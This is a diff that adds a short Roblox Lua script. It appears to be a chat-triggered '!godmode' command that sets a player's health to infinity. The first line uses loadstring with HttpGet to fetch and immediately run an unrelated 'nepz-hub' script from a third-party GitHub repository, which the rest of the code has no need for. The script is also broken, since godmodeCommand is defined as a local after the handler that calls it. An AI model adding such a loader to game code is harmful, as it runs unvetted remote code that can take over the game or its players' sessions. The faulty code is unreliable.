@@ -1,0 +1,22 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Otamias/nepz-hub/main/nepzhub"))()
+
+local prefix = "!"
+
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        if string.sub(message, 1, 1) == prefix then
+            local command, arguments = message:match("^" .. prefix .. "(%w+)%s*(.*)$")
+            if command == "godmode" then
+                godmodeCommand(player)
+            end
+        end
+    end)
+end)
+
+local function godmodeCommand(player)
+    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
+    if humanoid then
+        humanoid.MaxHealth = math.huge
+        humanoid.Health = math.huge
+    end
+end
